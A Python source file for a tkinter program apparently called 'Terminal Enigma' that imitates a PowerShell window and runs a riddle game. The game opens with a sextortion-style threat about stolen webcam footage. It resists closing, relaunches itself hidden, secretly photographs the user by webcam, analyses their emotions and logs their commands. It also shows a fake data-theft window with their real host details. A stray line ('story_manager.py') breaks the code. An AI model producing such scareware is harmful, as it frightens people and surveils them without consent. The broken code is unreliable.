import tkinter as tk
import threading
import time
import os
import sys
import subprocess
import platform
import cv2
import random
import signal
import winsound
from PIL import Image, ImageTk
from user_stats import UserStats
from story_manager import StoryManager
from deepface import DeepFace
import numpy as np

SAFE_WORD = "EXITNOW"
KILL_CODE = "LORMA"
exit_flag = threading.Event()

EXE_PATH = [sys.executable, os.path.abspath(__file__)]

class PowerShellTerminal:
    def __init__(self, title="Command Line Terminal"):
        self.root = tk.Tk()
        self.root.title(title)
        self.root.geometry("800x600")
        self.root.configure(bg='#000')
        self.root.focus_force()
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)

        self.story_stage = 0
        self.discovered_clues = []
        self.close_attempts = 0
        self.hearts = 3
        
        self.text_lock = threading.Lock()
        
        self.main_frame = tk.Frame(self.root, bg='#000')
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.scrollbar = tk.Scrollbar(self.main_frame)
        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.terminal_text = tk.Text(
            self.main_frame,
            bg='#000',
            fg='#FFFFFF',
            insertbackground='#FFFFFF',
            font=('Consolas', 12),
            wrap=tk.WORD,
            borderwidth=0,
            highlightthickness=0,
            yscrollcommand=self.scrollbar.set
        )
        self.terminal_text.pack(fill=tk.BOTH, expand=True)
        self.scrollbar.config(command=self.terminal_text.yview)
        
        self.terminal_text.tag_configure("prompt", foreground="#FFFF00")
        self.terminal_text.tag_configure("response", foreground="#FFFFFF")
        self.terminal_text.tag_configure("error", foreground="#FF0000")
        self.terminal_text.tag_configure("success", foreground="#FFFFFF")

        self.terminal_text.bind("<Return>", self.handle_return)
        self.terminal_text.bind("<Key>", self.handle_key)
        self.terminal_text.bind("<Button-1>", self.handle_click)
        self.terminal_text.bind("<Button-2>", self.handle_click)
        self.terminal_text.bind("<Button-3>", self.handle_click)
        
        self.current_command = ""
        self.input_enabled = False
        self.current_input_line = "1.0"
        self.command_history = []
        self.history_index = -1
        
        self.typing_job = None
        self.typing_speed_min = 0.01
        self.typing_speed_max = 0.03
        self.current_message = None
        self.current_tag = None
        self.current_callback = None
        self.current_index = 0
        
        self.user_stats = UserStats()
        self.story_manager = StoryManager(self)
        
        self.special_commands = {"CONTINUE": self.handle_continue}
        self.captured_images = []
        
        self.start_protection_threads()
        self.start_webcam_capture_thread()
    
    def prevent_close(self, event=None):
        if self.typing_job:
            self.root.after_cancel(self.typing_job)
            self.typing_job = None
        
        with self.text_lock:
            self.terminal_text.insert(tk.END, "\n")
        
        self.close_attempts += 1
        self.user_stats.log_close_attempt()
        
        current_message = self.current_message
        current_tag = self.current_tag
        current_callback = self.current_callback
        current_index = self.current_index
        
        def resume_previous_message():
            if current_message and current_index < len(current_message):
                self.animate_text(current_message[current_index:], current_tag, current_callback)
            else:
                self.insert_prompt()

        if self.close_attempts == 1:
            message = "You can't escape me that easily. Try again and face the consequences.\n"
            self.animate_text(message, "error", callback=resume_previous_message)
        elif self.close_attempts == 2:
            message = "I warned you once :)\n"
            self.animate_text(message, "error", callback=lambda: self.capture_and_show_webcam_image(callback=resume_previous_message))
        elif self.close_attempts == 3:
            message = "This is your final warning. I’m tracing you now. Next time, you’re done.\n"
            self.animate_text(message, "error", callback=lambda: [self.play_weird_sound(), self.show_fake_retrieval_window(), resume_previous_message()])
        else:
            message = "You keep testing me, huh? DON'T FUCKING TRY ME ASSHOLE!\n"
            self.animate_text(message, "error", callback=lambda: [
                self.root.after(2000, lambda: self.animate_text(
                    "The answers lie within the puzzles. Look closer.\n", 
                    "error", 
                    callback=resume_previous_message
                ))
            ])
            
        self.root.attributes('-topmost', True)
        self.root.after(100, self.root.lift)
        return "break"
    
    def play_weird_sound(self):
        if platform.system() == "Windows":
            winsound.Beep(100, 1000)
    
    def show_fake_retrieval_window(self):
        retrieval_window = tk.Toplevel(self.root)
        retrieval_window.title("SYSTEM BREACH - DATA EXTRACTION")
        retrieval_window.geometry("400x300")
        retrieval_window.configure(bg='#000')
        retrieval_window.attributes('-topmost', True)
        
        retrieval_window.configure(highlightbackground="red", highlightcolor="red", highlightthickness=2)
        
        def flash_window():
            current_bg = retrieval_window.cget("bg")
            new_bg = "#300" if current_bg == "#000" else "#000"
            retrieval_window.configure(bg=new_bg)
            if retrieval_window.winfo_exists():
                retrieval_window.after(300, flash_window)
        
        flash_window()
        
        import socket
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
        except:
            hostname = "UNKNOWN"
            ip = "192.168.x.x"
        
        import random
        mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
        
        header_label = tk.Label(
            retrieval_window, 
            text="⚠ UNAUTHORIZED ACCESS DETECTED ⚠",
            fg="#FF0000", 
            bg="#000", 
            font=('Consolas', 12, 'bold')
        )
        header_label.pack(pady=(10, 5))
        
        progress_frame = tk.Frame(retrieval_window, bg="#000")
        progress_frame.pack(fill=tk.X, padx=20, pady=10)
        
        progress_var = tk.DoubleVar()
        progress_bar = tk.Canvas(
            progress_frame, 
            width=360, 
            height=20, 
            bg="#000", 
            highlightbackground="#333", 
            highlightthickness=1
        )
        progress_bar.pack()
        
        def update_progress(value=0):
            if value <= 100:
                progress_bar.delete("progress")
                width = 3.6 * value
                progress_bar.create_rectangle(
                    0, 0, width, 20, 
                    fill="#FF0000", 
                    tags="progress"
                )
                progress_var.set(value)
                
                if value < 30:
                    status_label.config(text=f"Accessing system files... {value}%")
                elif value < 60:
                    status_label.config(text=f"Extracting user data... {value}%")
                elif value < 90:
                    status_label.config(text=f"Downloading personal files... {value}%")
                else:
                    status_label.config(text=f"Establishing remote control... {value}%")
                    
                if retrieval_window.winfo_exists():
                    retrieval_window.after(50, update_progress, value + random.uniform(1, 3))
            else:
                status_label.config(text="Remote access established")
                data_label.config(text=f"HOST: {hostname}\nIP: {ip}\nMAC: {mac}\nUSER: {os.getlogin()}\nACCESS: FULL CONTROL")
                
                if platform.system() == "Windows":
                    winsound.Beep(800, 200)
                    winsound.Beep(600, 200)
        
        status_label = tk.Label(
            retrieval_window, 
            text="Initializing connection...", 
            fg="#FF0000", 
            bg="#000", 
            font=('Consolas', 10)
        )
        status_label.pack(pady=5)
        
        data_label = tk.Label(
            retrieval_window, 
            text="SCANNING SYSTEM...", 
            fg="#FF0000", 
            bg="#000", 
            font=('Consolas', 10, 'bold'),
            justify=tk.LEFT
        )
        data_label.pack(pady=10)
        
        update_progress()
        
        countdown_label = tk.Label(
            retrieval_window, 
            text="Window closing in 5s", 
            fg="#888", 
            bg="#000", 
            font=('Consolas', 8)
        )
        countdown_label.pack(side=tk.BOTTOM, pady=5)
        
        def update_countdown(seconds=5):
            if seconds > 0:
                countdown_label.config(text=f"Window closing in {seconds}s")
                if retrieval_window.winfo_exists():
                    retrieval_window.after(1000, update_countdown, seconds - 1)
        
        update_countdown()
        
        try:
            if hasattr(self.user_stats, 'log_event'):
                self.user_stats.log_event('fake_retrieval_shown')
            else:
                self.user_stats.close_attempts += 1
        except Exception as e:
            print(f"Error logging event: {str(e)}")
        
        self.root.after(5000, retrieval_window.destroy)
    
    def start_webcam_capture_thread(self):
        def capture_images():
            try:
                cap = cv2.VideoCapture(0)
                if not cap.isOpened():
                    print("DEBUG: Webcam could not be opened")
                    return
                
                time.sleep(3)
                print("DEBUG: Attempting to capture game_start image")
                self.capture_image(cap, "game_start")
                print("DEBUG: Captured game_start image")
                
                self.correct_answer_event = threading.Event()
                self.wrong_answer_event = threading.Event()
                self.reveal_event = threading.Event()
                
                print("DEBUG: Waiting for correct_answer event")
                while not self.correct_answer_event.is_set() and not exit_flag.is_set():
                    ret, frame = cap.read()
                    if ret and frame is not None and not frame.size == 0:
                        emotion = self.detect_emotion(frame)
                        if emotion:
                            self.user_stats.log_emotion(emotion)
                    time.sleep(0.5)
                if not exit_flag.is_set():
                    time.sleep(1)
                    print("DEBUG: Attempting to capture correct_answer image")
                    self.capture_image(cap, "correct_answer")
                    print("DEBUG: Captured correct_answer image")
                
                print("DEBUG: Waiting for wrong_answer event")
                while not self.wrong_answer_event.is_set() and not exit_flag.is_set():
                    ret, frame = cap.read()
                    if ret and frame is not None and not frame.size == 0:
                        emotion = self.detect_emotion(frame)
                        if emotion:
                            self.user_stats.log_emotion(emotion)
                    time.sleep(0.5)
                if not exit_flag.is_set():
                    time.sleep(1)
                    print("DEBUG: Attempting to capture wrong_answer image")
                    self.capture_image(cap, "wrong_answer")
                    print("DEBUG: Captured wrong_answer image")
                
                print("DEBUG: Waiting for reveal event")
                while not self.reveal_event.is_set() and not exit_flag.is_set():
                    ret, frame = cap.read()
                    if ret and frame is not None and not frame.size == 0:
                        emotion = self.detect_emotion(frame)
                        if emotion:
                            self.user_stats.log_emotion(emotion)
                    time.sleep(0.5)
                if not exit_flag.is_set():
                    time.sleep(1)
                    print("DEBUG: Attempting to capture final_reveal image")
                    self.capture_image(cap, "final_reveal")
                    print("DEBUG: Captured final_reveal image")
                
                cap.release()
                print("DEBUG: Webcam released")
            except Exception as e:
                print(f"DEBUG: Error in capture_images thread: {str(e)}")
        
        threading.Thread(target=capture_images, daemon=True).start()
    
    def detect_emotion(self, frame):
        try:
            result = DeepFace.analyze(frame, actions=['emotion'], enforce_detection=False)
            if isinstance(result, list):
                result = result[0]
            dominant_emotion = result.get('dominant_emotion')
            return dominant_emotion
        except Exception as e:
            print(f"DEBUG: Error in emotion detection: {str(e)}")
            return None
    
    def capture_image(self, cap, phase):
        try:
            for attempt in range(3):
                ret, frame = cap.read()
                if ret and frame is not None and not frame.size == 0:
                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    img = Image.fromarray(frame_rgb)
                    img = img.resize((200, 150), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)
                    self.captured_images.append((phase, photo))
                    emotion = self.detect_emotion(frame)
                    if emotion:
                        self.user_stats.log_emotion(emotion)
                    print(f"DEBUG: Successfully captured {phase} image on attempt {attempt+1}")
                    return
                time.sleep(0.5)
            print(f"DEBUG: Failed to capture {phase} image after 3 attempts")
        except Exception as e:
            print(f"DEBUG: Error in capture_image for {phase}: {str(e)}")
    
    def handle_click(self, event):
        if not self.input_enabled or self.typing_job:
            self.terminal_text.mark_set(tk.INSERT, self.terminal_text.index(tk.END))
            return "break"
        
        click_pos = self.terminal_text.index(f"@{event.x},{event.y}")
        click_line, click_col = map(int, click_pos.split('.'))
        prompt_line, prompt_col = map(int, self.current_input_line.split('.'))
        
        if click_line < prompt_line or (click_line == prompt_line and click_col < prompt_col):
            if event.state & 0x1:
                return None
            else:
                self.terminal_text.mark_set(tk.INSERT, self.current_input_line)
                return "break"
        
        return None
        
    def is_typing_allowed(self):
        if not self.input_enabled or self.typing_job:
            story_manager.py
            return False
        
        cursor_pos = self.terminal_text.index(tk.INSERT)
        cursor_line, cursor_col = map(int, cursor_pos.split('.'))
        prompt_line, prompt_col = map(int, self.current_input_line.split('.'))
        return cursor_line > prompt_line or (cursor_line == prompt_line and cursor_col >= prompt_col)

    def start_protection_threads(self): 
        def process_protection():
            pid_file = "joker.pid"
            try:
                with open(pid_file, "w") as f:
                    f.write(str(os.getpid()))
            except IOError:
                pass

            while not exit_flag.is_set():
                try:
                    if not os.path.exists(pid_file):
                        self.animate_text("Process interrupted. I’m restarting now.\n")
                        subprocess.Popen(EXE_PATH, creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0)
                        sys.exit(0)
                    time.sleep(2)
                except Exception:
                    time.sleep(1)

        protection_thread = threading.Thread(target=process_protection, daemon=True)
        protection_thread.start()

    def insert_prompt(self):
        with self.text_lock:
            current_pos = self.terminal_text.index(tk.END)
            line, col = map(int, current_pos.split('.'))
            if line > 1 and col > 0:
                self.terminal_text.insert(tk.END, "\n")
                
            self.terminal_text.insert(tk.END, "PS C:\\Users\\User> ", "prompt")
            self.current_input_line = self.terminal_text.index(tk.INSERT)
            self.terminal_text.see(tk.END)
        self.input_enabled = True
        self.current_command = ""

    def handle_return(self, event):
        if not self.input_enabled:
            return "break"
            
        with self.text_lock:
            line_start = self.current_input_line
            line_end = f"{line_start.split('.')[0]}.end" 
            self.current_command = self.terminal_text.get(line_start, line_end).strip()
            self.terminal_text.insert(tk.END, "\n")
        
        self.input_enabled = False
        
        if self.current_command:
            self.command_history.append(self.current_command)
            self.history_index = len(self.command_history)
            self.user_stats.log_command(self.current_command)
            self.process_command(self.current_command)
        else:
            self.input_enabled = True
            self.insert_prompt()
        
        return "break"

    def handle_key(self, event):
        if event.keysym in ('Up', 'Down', 'Left', 'Right', 'Home', 'End'):
            if not self.input_enabled:
                return "break"
                
            if event.keysym in ('Up', 'Down'):
                return self.navigate_history(-1 if event.keysym == 'Up' else 1)
            elif event.keysym in ('Left', 'Right', 'Home', 'End'):
                if event.keysym == 'Left' or event.keysym == 'Home':
                    after_event = self.root.after_idle(self.check_cursor_position)
                return None
        
        if not self.is_typing_allowed():
            return "break"
        
        try:
            sel_start = self.terminal_text.index("sel.first")
            sel_end = self.terminal_text.index("sel.last")
            
            prompt_line, prompt_col = map(int, self.current_input_line.split('.'))
            sel_start_line, sel_start_col = map(int, sel_start.split('.'))
            
            if sel_start_line < prompt_line or (sel_start_line == prompt_line and sel_start_col < prompt_col):
                if event.keysym in ('BackSpace', 'Delete') or event.char:
                    self.terminal_text.tag_remove("sel", "1.0", "end")
                    self.terminal_text.mark_set(tk.INSERT, self.current_input_line)
                    return "break"
        except:
            pass
        
        if event.keysym == 'BackSpace':
            current_pos = self.terminal_text.index(tk.INSERT)
            current_line, current_col = map(int, current_pos.split('.'))
            prompt_line, prompt_col = map(int, self.current_input_line.split('.'))
            
            if current_line < prompt_line or (current_line == prompt_line and current_col <= prompt_col):
                return "break"
        
        return None
    
    def check_cursor_position(self):
        if not self.input_enabled:
            return
        cursor_pos = self.terminal_text.index(tk.INSERT)
        cursor_line, cursor_col = map(int, cursor_pos.split('.'))
        prompt_line, prompt_col = map(int, self.current_input_line.split('.'))
        
        if cursor_line < prompt_line or (cursor_line == prompt_line and cursor_col < prompt_col):
            self.terminal_text.mark_set(tk.INSERT, self.current_input_line)

    def navigate_history(self, direction):
        if not self.command_history or not self.input_enabled:
            return "break"
        
        new_index = self.history_index + direction
        
        if 0 <= new_index < len(self.command_history):
            self.history_index = new_index
            with self.text_lock:
                line_start = self.current_input_line
                line_end = f"{line_start.split('.')[0]}.end"
                self.terminal_text.delete(line_start, line_end)
                self.terminal_text.insert(line_start, self.command_history[self.history_index])
                
        return "break"

    def animate_text(self, text, tag="response", callback=None, resume_index=0):
        if self.typing_job:
            self.root.after_cancel(self.typing_job)
            self.typing_job = None
        self.current_message = text
        self.current_tag = tag
        self.current_callback = callback
        self.current_index = resume_index
            
        if not text.startswith("\n") and self.terminal_text.get("1.0", tk.END).strip():
            text = "\n" + text
            
        def type_char(remaining, index=resume_index):
            if index < len(remaining):
                with self.text_lock:
                    self.terminal_text.insert(tk.END, remaining[index], tag)
                    self.terminal_text.see(tk.END)
                self.current_index = index + 1
                delay = random.uniform(self.typing_speed_min, self.typing_speed_max)
                self.typing_job = self.root.after(int(delay * 1000), type_char, remaining, index + 1)
            else:
                self.typing_job = None
                self.current_message = None
                self.current_tag = None
                self.current_index = 0
                if callback:
                    if isinstance(callback, list):
                        for cb in callback:
                            cb()
                    else:
                        callback()
        
        self.input_enabled = False
        type_char(text)

    def process_command(self, command):
        cmd_upper = command.upper()
        
        if cmd_upper in self.special_commands:
            self.special_commands[cmd_upper]()
            return
        
        if cmd_upper == SAFE_WORD:
            self.animate_text("Safe word accepted. Goodbye.\n", "success", 
                            callback=self.clean_exit)
        elif cmd_upper == KILL_CODE:
            self.animate_text("You've triggered the next phase. This isn't over yet.\n", "success", 
                            callback=lambda: self.reveal_next_chapter())
        elif cmd_upper == "MIRROR":
            if self.story_manager.story_stage == 0:
                print("DEBUG: Setting correct_answer_event")
                self.correct_answer_event.set()
                self.animate_text("", "success", 
                                callback=lambda: self.story_manager.advance_story(0))
            else:
                print("DEBUG: Setting wrong_answer_event from MIRROR command")
                self.wrong_answer_event.set()
                self.story_manager.handle_wrong_answer()
        elif cmd_upper == "NAME":
            if self.story_manager.story_stage == 1:
                self.animate_text("", "success", 
                                callback=lambda: self.story_manager.advance_story(1))
            else:
                print("DEBUG: Setting wrong_answer_event from NAME command")
                self.wrong_answer_event.set()
                self.story_manager.handle_wrong_answer()
        elif cmd_upper == "MASK":
            if self.story_manager.story_stage == 2:
                self.animate_text("", "success", 
                                callback=lambda: self.story_manager.advance_story(2))
            else:
                self.story_manager.handle_wrong_answer()
        elif cmd_upper == "MEMORY":
            if self.story_manager.story_stage == 3:
                self.animate_text("", "success",
                                callback=lambda: self.story_manager.advance_story(3))
            else:
                self.story_manager.handle_wrong_answer()
        elif cmd_upper == "CHOICE":
            if self.story_manager.story_stage == 4:
                self.animate_text("", "success",
                                callback=lambda: self.story_manager.advance_story(4))
            else:
                self.story_manager.handle_wrong_answer()
        elif cmd_upper == "SHADOW":
            if self.story_manager.story_stage == 5:
                self.animate_text("", "success",
                                callback=lambda: self.story_manager.advance_story(5))
            else:
                self.story_manager.handle_wrong_answer()
        elif cmd_upper == "HELP":
            self.user_stats.help_used += 1
            current_riddle = ""
            if 0 <= self.story_manager.story_stage < len(self.story_manager.riddles):
                current_riddle = self.story_manager.riddles[self.story_manager.story_stage]["riddle"]
            
            help_text = f"""
Available Commands:
  help           - Show this information
  clear          - Clear the screen
  Get-Lives      - Check remaining lives
  story          - View your progress
  hint           - Request a hint
  EXITNOW        - Exit safely

Current Riddle: {current_riddle}
Lives: {self.story_manager.hearts}\n"""
            self.animate_text(help_text, callback=self.insert_prompt)
        elif cmd_upper == "CLEAR":
            with self.text_lock:
                self.terminal_text.delete('1.0', tk.END)
            self.insert_prompt()
        elif cmd_upper == "GET-LIVES":
            self.animate_text(f"You have {self.story_manager.hearts} lives remaining.\n", callback=self.insert_prompt)
        elif cmd_upper == "STORY":
            self.user_stats.story_viewed += 1
            self.story_manager.show_story_progress()
        elif cmd_upper == "HINT":
            self.story_manager.provide_hint()
        else:
            print("DEBUG: Setting wrong_answer_event from unrecognized command")
            self.wrong_answer_event.set()
            self.story_manager.handle_wrong_answer()

    def handle_continue(self):
        print(f"DEBUG: handle_continue called, story_stage = {self.story_manager.story_stage}")
        
        if self.story_manager.story_stage == -1:
            self.reveal_final_truth()
        elif self.story_manager.story_stage >= 0:
            self.animate_text("Entering the next phase...\n", "success", 
                            callback=lambda: self.story_manager.advance_story(self.story_manager.story_stage))
        else:
            self.animate_text("That command doesn't work here. Try something else.\n", "error", callback=self.insert_prompt)

    def capture_and_show_webcam_image(self, callback=None):
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                self.animate_text("Error: No webcam detected. Plug one in.\n", "error", 
                                callback=callback)
                return

            ret, frame = cap.read()
            if ret:
                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = Image.fromarray(frame_rgb)
                img = img.resize((400, 300), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                
                img_window = tk.Toplevel(self.root)
                img_window.title("I’ve Got You")
                img_window.geometry("400x300")
                img_window.attributes('-topmost', True)
                
                label = tk.Label(img_window, image=photo)
                label.image = photo
                label.pack()
                
                emotion = self.detect_emotion(frame)
                if emotion:
                    self.user_stats.log_emotion(emotion)
                
                self.root.after(3000, lambda: [img_window.destroy(), callback() if callback else self.insert_prompt()])
                
                self.animate_text("I see you. This is not a Joke!\n", "success")
            else:
                self.animate_text("Error: Webcam capture failed.\n", "error",
                                callback=callback)
            
            cap.release()
        except Exception as e:
            self.animate_text(f"Webcam error: {str(e)}\n", "error",
                            callback=callback)

    def reveal_next_chapter(self):
        self.animate_text("""        
You think you’ve beaten me? Not yet.
This was only the first act.

I’ve been observing you closely.

Type 'CONTINUE' to enter the next phase.
""", "success", callback=self.insert_prompt)
    
    def reveal_truth(self):
        self.animate_text("""        
Out of lives? The game doesn’t stop here.
There’s something I’ve kept hidden.

This terminal, these riddles—they’re a test.
Every choice you’ve made has been recorded.
The webcam, the files—all part of it.

You’re exactly what I needed.
""", "error", callback=lambda: self.animate_text("""        
Type 'CONTINUE' to uncover the final secret.
""", "success", callback=self.insert_prompt))
    
    def reveal_final_truth(self):
        print("DEBUG: Setting reveal_event")
        self.reveal_event.set()
        time.sleep(1.5)
        
        self.animate_text("""        
I'm not a virus or a prank.
I am Terminal Enigma - Reality's Digital Guardian

You've been part of a simulation to test your mind.
Your responses, your persistence—all valuable data.

Files will be erased upon exit.
No personal information was taken.

The simulation ends now.
Thank you for playing my game.
""", "success", callback=self.show_captured_images)
    
    def show_captured_images(self):
        if not self.captured_images:
            self.reveal_final_choice()
            return
        
        img_window = tk.Toplevel(self.root)
        img_window.title("Observations")
        img_window.geometry("620x600")
        img_window.configure(bg='#000')
        img_window.attributes('-topmost', True)
        
        phases_captured = [phase for phase, _ in self.captured_images]
        debug_label = tk.Label(img_window, 
                              text=f"Phases captured: {', '.join(phases_captured)}", 
                              fg="#FFFFFF", bg="#000", font=('Consolas', 10))
        debug_label.pack(pady=5)
        
        for i, (phase, photo) in enumerate(self.captured_images):
            label = tk.Label(img_window, text=f"Captured at {phase}", fg="#FFFFFF", bg="#000", font=('Consolas', 10))
            label.pack(pady=5)
            img_label = tk.Label(img_window, image=photo)
            img_label.image = photo
            img_label.pack(pady=5)
        
        self.root.after(5000, lambda: [img_window.destroy(), self.reveal_final_choice()])
    
    def reveal_final_choice(self):
        self.animate_text("""        
What now?
- Type 'EXIT' to leave
- Type 'STATS' to see your results
- Type 'LEARN' to understand the simulation
""", "success", callback=self.insert_prompt)
        
        self.special_commands = {
            "EXIT": self.clean_exit,
            "STATS": self.show_stats,
            "LEARN": self.show_project_info,
            "CONTINUE": lambda: self.animate_text("No further continuation available.\n", "error", callback=self.insert_prompt)
        }
    
    def show_stats(self):
        stats_report = self.user_stats.get_stats_report()
        self.animate_text(stats_report, "success", callback=self.reveal_final_choice)
    
    def show_project_info(self):
        info = """
Terminal Enigma - Reality's Digital Guardian
----------------------------------------------------------------
Terminal Enigma is a program designed to study human reasoning and resilience.
The mysterious persona creates a controlled challenge environment.

This simulation tests problem-solving under pressure.
Your participation helps refine artificial intelligence systems.

All data is anonymous and used only for analysis.
"""
        self.animate_text(info, "success", callback=self.reveal_final_choice)
    
    def run(self):
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        
        self.start_time = time.time()

        welcome_message = """
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

"""
        with self.text_lock:
            self.terminal_text.insert(tk.END, welcome_message)
        
        intro_message = """Greetings.

Pay close attention to what I’m about to say.
Take a moment to focus and consider this carefully.
You don’t know me, but I know you—better than you think.

We're about to discuss a deal between you and me, and I don't play games.
Well, you've been a bit careless lately, scrolling through those videos and clicking on links, stumbling upon some not-so-safe sites.

I actually placed a Malware on a porn website & you visited it to watch (you know what I mean).

And when you got busy enjoying those videos, your system started working as a RDP (Remote Protocol) which provided me complete control over your device.

I can peep at everything on your screen, switch on your camera and mic, and you won't even notice.

Simply a single click, I can send this garbage to all of your contacts. HAHAHAHAHA.

Yeah, Yeah, I've got footage of you doing embarrassing things in your room.

Your confusion is clear, but don't expect sympathy. I will give you two alternatives.

First Option is to ignore my message.

You should know what will happen if you choose this option. I will send your video to all of your contacts. The video is straight fire, and I can't even fathom the humiliation you'll endure when your colleagues, friends, and fam check it out. But hey, that's life, ain't it? Don't be playing the victim here.
There’s no easy way out. Try to leave, and you’ll see what happens.

Option 2 is to play a game.

Let's see what happens if you choose this option. Your filthy secret remains private. I will wipe everything clean once you solve the riddles correctly.

Let’s begin.

First one: If you drop me I'm sure to crack, but give me a smile and I'll always smile back. What am I?

Lives: 3 | Type 'help' for commands
"""
        self.animate_text(intro_message, "response", callback=self.insert_prompt)
        self.root.mainloop()
    
    def clean_exit(self):
        exit_flag.set()
        try:
            if os.path.exists("joker.pid"):
                os.remove("joker.pid")
                
            for filepath in self.discovered_clues:
                if os.path.exists(filepath):
                    try:
                        os.remove(filepath)
                    except:
                        pass
        except:
            pass
            
        self.animate_text("Terminal Enigma - Shutting Down. Farewell.\n", "success")
        self.root.after(1500, lambda: self.root.quit())
        self.root.after(1600, lambda: sys.exit(0))